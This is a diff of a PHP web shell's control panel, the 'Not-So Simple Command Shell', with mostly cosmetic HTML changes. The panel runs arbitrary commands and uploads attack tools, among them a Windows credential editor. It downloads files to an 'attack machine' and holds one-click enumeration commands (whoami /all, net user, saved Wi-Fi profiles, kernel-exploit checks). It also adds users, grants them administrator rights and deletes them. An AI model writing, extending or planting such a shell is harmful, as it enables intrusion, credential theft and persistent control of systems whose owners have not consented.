@@ -28,10 +28,10 @@
         $attackport = "8000";
         echo '
         <div style="border:1px solid #333;width:50%;padding:0px 30px;border-radius:10px;margin:10px 40px;">
-        <h4 style="">The Not So Simple Command Shell</h4>
+        <p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
         <form action="" method="get">Command? <input type="text" name="cmd" autofocus/>
-        <button type="submit">Execute</button>&nbsp;<a href="?links=1"> Show QuickLinks</a>&nbsp;<a href="?update=true">Update NSSCMD</a></form>
-        <p>File Options</p>
+        <button type="submit">Execute</button>&nbsp;&nbsp;&nbsp;<a href="?links=1">&nbsp;QuickLinks</a></form><br>
+        File Options<br>
         <form action="" method="get">
         <select name="upload">
         <option>Choose</option>
@@ -50,20 +50,20 @@
         <option value="wce-universal.exe" title="windows credential editor that only seems to work with xp">WCE Universal</option>
         </select><button type="submit">Upload</button>
         </form>
-        <p>&nbsp;</p>
+        <br>
         <form action="" method="get" enctype="multipart/form-data"><input name="upload" type="file" placeholder="File to Upload"/><button type="submit">Upload</button></form><br>
-        <form action="" method="get"><input type="text" name="download" placeholder="File to Download"/><button type="submit" title="downloads file to attack machine">Download</button></form>
+        <form action="" method="get"><input type="text" name="download" placeholder="File to Download"/><button type="submit" title="downloads file to attack machine">Download</button></form><br>
         <form action="" method="get">
-        <p>Quick Enum Options</p>
+        Quick Enum Options<br>
         <button type="submit" name="cmd" value="systeminfo" title="runs systeminfo command">System Info</button>&nbsp;<button type="submit" name="cmd" value="whoami" title="shows current user">Whoami</button>&nbsp<button type="submit" name="cmd" value="echo %username%" title="another option to display current user">Username</button>&nbsp;<button type="submit" name="cmd" value="whoami /all" title="gives current user information">User Info</button>&nbsp;<button type="submit" name="cmd" value="net user" title="lists all users">All Users</button>&nbsp;<button type="submit" name="cmd" value="netsh wlan show profiles" title="shows saved wifi ap data if the target uses a wifi interface">WLAN Profiles</button><br><br><button type="submit" name="cmd" value="tasklist" title="show running processes">Processes</button>&nbsp<button type="submit" name="cmd" value="driverquery" title="list drivers">Drivers</button>&nbsp<button type="submit" name="cmd" value="driverquery | findstr Kernel" title="look for potential kernel exploits">Kernel Exploits</button>&nbsp<button type="submit" name="cmd" value="fsutil fsinfo drives" title="list all drives">List Drives</button>&nbsp<button type="submit" name="cmd" value="set" title="environment variable settings">EnVars</button>&nbsp;<button type="submit" name="cmd" value="qwinsta" title="information about sessions">Query Session</button>
-        </form>
-        <p>User Management Options</p>
+        </form><br>
+        User Management Options<br>
         <form action="" method="get">
         <input type="text" name="user" placeholder="user to alter" />&nbsp;&nbsp;<input type="text" name="pass" placeholder="password if adding user" />
         <br><br>
         <button type="submit" name="addUser" title="adds the secified user to the system with the password provided.">Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user.">Set Admin</button>&nbsp;<button type="submit" name="userStandard" title="sets the specified user as a standard user. only works with sufficient permissions on the current user.">Set Standard User</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user.">DelUser</button>&nbsp;&nbsp;&nbsp;&nbsp;<button onClick="window.location.reload();">Clear Console</button>
-        </form>
-        <p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
+        </form><br>
+<a href="?update=true">Update</a><br><br>
         </div>';
 
         if (isset($_GET['addUser'])){
